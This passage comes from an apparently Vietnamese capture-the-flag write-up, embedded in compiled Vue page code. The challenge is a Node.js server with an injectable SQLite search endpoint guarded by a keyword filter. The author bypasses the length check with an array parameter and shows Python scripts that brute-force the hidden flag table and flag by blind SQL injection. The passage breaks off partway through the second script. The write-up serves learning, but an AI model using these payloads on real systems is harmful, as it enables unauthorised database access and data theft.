dataToInsert <span class="token operator">=</span> <span class="token punctuation">[</span></span>\n<span class="line">    <span class="token punctuation">{</span> <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token literal-property property">joke</span><span class="token operator">:</span> <span class="token string">&quot;What did the bartender say to the jumper cables? You better not try to start anything.&quot;</span><span class="token punctuation">}</span><span class="token punctuation">,</span></span>\n<span class="line">    <span class="token operator">...</span></span>\n<span class="line">  <span class="token punctuation">]</span><span class="token punctuation">;</span></span>\n<span class="line">  </span>\n<span class="line">  dataToInsert<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span></span>\n<span class="line">    stmt<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>id<span class="token punctuation">,</span> data<span class="token punctuation">.</span>joke<span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">  </span>\n<span class="line">  stmt<span class="token punctuation">.</span><span class="token function">finalize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line"></span>\n<span class="line">    <span class="token keyword">const</span> flagTable <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">flag_</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>uuid<span class="token punctuation">.</span><span class="token function">v4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">-</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">&#39;_&#39;</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span></span>\n<span class="line">    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">flagTable: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>flagTable<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">    db<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">CREATE TABLE IF NOT EXISTS </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>flagTable<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> (flag TEXT)</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line"></span>\n<span class="line">    db<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">INSERT INTO </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>flagTable<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> (flag) VALUES (&#39;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>flag<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&#39;)</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line"><span class="token punctuation">}</span><span class="token punctuation">)</span></span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Tuy nhiên table flag được sinh ngẫu nhiên nên ta cần bruteforce để biết tên của table này. <br>Khi GET đến <code>/search</code> với <code>name</code>, server sẽ đọc từ table API và trả về câu joke với <code>id</code> là value của name -&gt; Có thể SQLi ở đây.</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line">app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&#39;/search&#39;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span></span>\n<span class="line">    <span class="token keyword">const</span> <span class="token punctuation">{</span> name <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">;</span></span>\n<span class="line">    <span class="token keyword">const</span> Filterduidui <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(union|or|substring|substrs|if|case|=|when|then|join|load_extension|likely|unhex|\\|\\|)</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">;</span></span>\n<span class="line"></span>\n<span class="line">    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">&#39;/search?name=1&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">    <span class="token punctuation">}</span></span>\n<span class="line"></span>\n<span class="line">    <span class="token keyword">if</span> <span class="token punctuation">(</span>Filterduidui<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">err</span><span class="token operator">:</span> <span class="token string">&#39;chuc mung ban da giai duoc challenge nay&#39;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">    <span class="token punctuation">}</span></span>\n<span class="line"></span>\n<span class="line">    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">err</span><span class="token operator">:</span> <span class="token string">&#39;Try with name param&#39;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">    <span class="token punctuation">}</span></span>\n<span class="line"></span>\n<span class="line">    <span class="token keyword">if</span> <span class="token punctuation">(</span>name<span class="token punctuation">.</span>length <span class="token operator">&gt;</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">err</span><span class="token operator">:</span> <span class="token string">&#39;U r hacker?&#39;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">    <span class="token punctuation">}</span></span>\n<span class="line"></span>\n<span class="line">    <span class="token keyword">let</span> query <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">SELECT * FROM API WHERE id LIKE &#39;%</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">%&#39;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span></span>\n<span class="line">    db<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">SELECT * FROM API WHERE id LIKE &#39;%</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">%&#39;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> rows</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span></span>\n<span class="line">        <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">            console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>err<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">&#39;Hey, what r u doing??? i will call police or don\\&#39;t hack this machine&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">        <span class="token punctuation">}</span></span>\n<span class="line"></span>\n<span class="line">        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>rows<span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Server sẽ kiểm tra length của <code>?name</code>, ta có thể bypass bằng cách truyền vào array object thay vì chuỗi thông thường. <code>?name[]=</code> là array khi truyền vào có 1 phần tử nên length sẽ chỉ trả về <code>1</code>. <br>Ban đầu mình nghĩ đây là bài SQLi bình thường, tìm cách để server trả về flag từ table. Nhưng do filter đã chặn <code>UNION</code> và <code>||</code> nên mình nghĩ tới hướng blind sql. Đầu tiên là cần có được tên của flag table. Table được sinh ngẫu nhiên với <code>uuid.v4()</code>, đoạn này chỉ bao gồm các kí tự <code>[a-f0-9]</code> Table sẽ có tên dạng <code>flag_????????_????_????_????_????????????</code> trong đó <code>?</code> là các kí tự cần tìm. Giờ chỉ cần bruteforce</p><p>Sau khi chạy xong sẽ ra table là <code>flag_c1abd148_acae_40be_a953_eae333f90da0</code>. Ta lại bruteforce tiếp để tìm flag</p>', 6)),
    createVNode(_component_CodeGroup, null, {
      default: withCtx(() => [
        createVNode(_component_CodeGroupItem, { title: "getTableName.py" }, {
          default: withCtx(() => _cache[6] || (_cache[6] = [
            createBaseVNode("div", {
              class: "language-python line-numbers-mode",
              "data-highlighter": "prismjs",
              "data-ext": "py",
              "data-title": "py"
            }, [
              createBaseVNode("pre", null, [
                createBaseVNode("code", null, [
                  createBaseVNode("span", { class: "line" }, [
                    createBaseVNode("span", { class: "token keyword" }, "import"),
                    createTextVNode(" requests")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createBaseVNode("span", { class: "token keyword" }, "from"),
                    createTextVNode(" threading "),
                    createBaseVNode("span", { class: "token keyword" }, "import"),
                    createTextVNode(" Thread")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createBaseVNode("span", { class: "token triple-quoted-string string" }, '"""'),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, "Payload: ?name[]=1' AND (SELECT hex(tbl_name) FROM sqlite_master WHERE type LIKE 'table' and tbl_name like '{}%' limit 1 offset 0) > '0';--"),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, "  - {} is table name"),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, "  - Server will return [] if table name is not exist"),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, '"""')
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("URL "),
                    createBaseVNode("span", { class: "token operator" }, "="),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, `"http://45.122.249.68:20020/search?name[]=1'+AND+(SELECT+hex(tbl_name)+FROM+sqlite_master+WHERE+type+LIKE+'table'+and+tbl_name+like+'{}%25'+limit+1+offset+0)+>+'0'%3b--"`)
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("CHARS "),
                    createBaseVNode("span", { class: "token operator" }, "="),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'09123456789abcdef'")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("table "),
                    createBaseVNode("span", { class: "token operator" }, "="),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token punctuation" }, "["),
                    createBaseVNode("span", { class: "token string" }, "'f'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'l'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'a'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'g'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, "'_'"),
                    createBaseVNode("span", { class: "token punctuation" }, "]")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createBaseVNode("span", { class: "token keyword" }, "def"),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token function" }, "check"),
                    createBaseVNode("span", { class: "token punctuation" }, "("),
                    createTextVNode("index"),
                    createBaseVNode("span", { class: "token punctuation" }, ")"),
                    createBaseVNode("span", { class: "token punctuation" }, ":")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("    currentTable "),
                    createBaseVNode("span", { class: "token operator" }, "="),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token punctuation" }, "["),
                    createBaseVNode("span", { class: "token operator" }, "*"),
                    createTextVNode("table"),
                    createBaseVNode("span", { class: "token punctuation" }, "]")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("    "),
                    createBaseVNode("span", { class: "token keyword" }, "for"),
                    createTextVNode(" char "),
                    createBaseVNode("span", { class: "token keyword" }, "in"),
                    createTextVNode(" chars"),
                    createBaseVNode("span", { class: "token punctuation" }, ":")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("        currentTable"),
                    createBaseVNode("span", { class: "token punctuation" }, "["),
                    createTextVNode("index"),
                    createBaseVNode("span", { class: "token punctuation" }, "]"),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token operator" }, "="),
                    createTextVNode(" char")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("        r "),
                    createBaseVNode("span", { class: "token operator" }, "="),
                    createTextVNode(" requests"),
                    createBaseVNode("span", { class: "token punctuation" }, "."),
                    createTextVNode("get"),
                    createBaseVNode("span", { class: "token punctuation" }, "("),
                    createTextVNode("url"),
                    createBaseVNode("span", { class: "token operator" }, "="),
                    createTextVNode("URL"),
                    createBaseVNode("span", { class: "token punctuation" }, "."),
                    createBaseVNode("span", { class: "token builtin" }, "format"),
                    createBaseVNode("span", { class: "token punctuation" }, "("),
                    createBaseVNode("span", { class: "token string" }, "''"),
                    createBaseVNode("span", { class: "token punctuation" }, "."),
                    createTextVNode("join"),
                    createBaseVNode("span", { class: "token punctuation" }, "("),
                    createTextVNode("currentTable"),
                    createBaseVNode("span", { class: "token punctuation" }, ")"),
                    createBaseVNode("span", { class: "token punctuation" }, ")"),
                    createBaseVNode("span", { class: "token punctuation" }, ")")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("        "),
                    createBaseVNode("span", { class: "token keyword" }, "if"),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token punctuation" }, "("),
                    createTextVNode("r"),
                    createBaseVNode("span", { class: "token punctuation" }, "."),
                    createTextVNode("text "),
                    createBaseVNode("span", { class: "token operator" }, "!="),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, '"[]"'),
                    createBaseVNode("span", { class: "token punctuation" }, ")"),
                    createBaseVNode("span", { class: "token punctuation" }, ":")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("            table"),
                    createBaseVNode("span", { class: "token punctuation" }, "["),
                    createTextVNode("index"),
                    createBaseVNode("span", { class: "token punctuation" }, "]"),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token operator" }, "="),
                    createTextVNode(" char")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("            "),
                    createBaseVNode("span", { class: "token keyword" }, "print"),
                    createBaseVNode("span", { class: "token punctuation" }, "("),
                    createTextVNode("table"),
                    createBaseVNode("span", { class: "token punctuation" }, ")")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("            "),
                    createBaseVNode("span", { class: "token keyword" }, "return")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createBaseVNode("span", { class: "token keyword" }, "if"),
                    createTextVNode(" __name__ "),
                    createBaseVNode("span", { class: "token operator" }, "=="),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token string" }, '"__main__"'),
                    createBaseVNode("span", { class: "token punctuation" }, ":")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("    "),
                    createBaseVNode("span", { class: "token keyword" }, "for"),
                    createTextVNode(" i "),
                    createBaseVNode("span", { class: "token keyword" }, "in"),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token builtin" }, "range"),
                    createBaseVNode("span", { class: "token punctuation" }, "("),
                    createBaseVNode("span", { class: "token number" }, "5"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token builtin" }, "len"),
                    createBaseVNode("span", { class: "token punctuation" }, "("),
                    createTextVNode("table"),
                    createBaseVNode("span", { class: "token punctuation" }, ")"),
                    createBaseVNode("span", { class: "token punctuation" }, ")"),
                    createBaseVNode("span", { class: "token punctuation" }, ":")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("        "),
                    createBaseVNode("span", { class: "token comment" }, "# Skip default '_' character")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("        "),
                    createBaseVNode("span", { class: "token keyword" }, "if"),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token punctuation" }, "("),
                    createTextVNode("i "),
                    createBaseVNode("span", { class: "token keyword" }, "in"),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token punctuation" }, "["),
                    createBaseVNode("span", { class: "token number" }, "13"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token number" }, "18"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token number" }, "23"),
                    createBaseVNode("span", { class: "token punctuation" }, ","),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token number" }, "28"),
                    createBaseVNode("span", { class: "token punctuation" }, "]"),
                    createBaseVNode("span", { class: "token punctuation" }, ")"),
                    createBaseVNode("span", { class: "token punctuation" }, ":"),
                    createTextVNode(),
                    createBaseVNode("span", { class: "token keyword" }, "continue")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createTextVNode("        Thread"),
                    createBaseVNode("span", { class: "token punctuation" }, "("),
                    createTextVNode("target"),
                    createBaseVNode("span", { class: "token operator" }, "="),
                    createBaseVNode("span", { class: "token keyword" }, "lambda"),
                    createBaseVNode("span", { class: "token punctuation" }, ":"),
                    createTextVNode(" check"),
                    createBaseVNode("span", { class: "token punctuation" }, "("),
                    createTextVNode("i"),
                    createBaseVNode("span", { class: "token punctuation" }, ")"),
                    createBaseVNode("span", { class: "token punctuation" }, ")"),
                    createBaseVNode("span", { class: "token punctuation" }, "."),
                    createTextVNode("start"),
                    createBaseVNode("span", { class: "token punctuation" }, "("),
                    createBaseVNode("span", { class: "token punctuation" }, ")")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" })
                ])
              ]),
              createBaseVNode("div", {
                class: "line-numbers",
                "aria-hidden": "true",
                style: { "counter-reset": "line-number 0" }
              }, [
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" }),
                createBaseVNode("div", { class: "line-number" })
              ])
            ], -1)
          ])),
          _: 1
        }),
        createVNode(_component_CodeGroupItem, { title: "getFlag.py" }, {
          default: withCtx(() => _cache[7] || (_cache[7] = [
            createBaseVNode("div", {
              class: "language-python line-numbers-mode",
              "data-highlighter": "prismjs",
              "data-ext": "py",
              "data-title": "py"
            }, [
              createBaseVNode("pre", null, [
                createBaseVNode("code", null, [
                  createBaseVNode("span", { class: "line" }, [
                    createBaseVNode("span", { class: "token keyword" }, "import"),
                    createTextVNode(" requests")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createBaseVNode("span", { class: "token keyword" }, "from"),
                    createTextVNode(" threading "),
                    createBaseVNode("span", { class: "token keyword" }, "import"),
                    createTextVNode(" Thread")
                  ]),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }),
                  createTextVNode("\n"),
                  createBaseVNode("span", { class: "line" }, [
                    createBaseVNode("span", { class: "token triple-quoted-string string" }, '"""'),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, "URL_LENGTH_CHECK: ?name[]=1' AND (SELECT length(flag) FROM flag_c1abd148_acae_40be_a953_eae333f90da0) > {};--"),
                    createTextVNode("\n"),
                    createBaseVNode("span", { class: "line" }, "  - {} is flag length"),
                    createTextVNode("\n"),
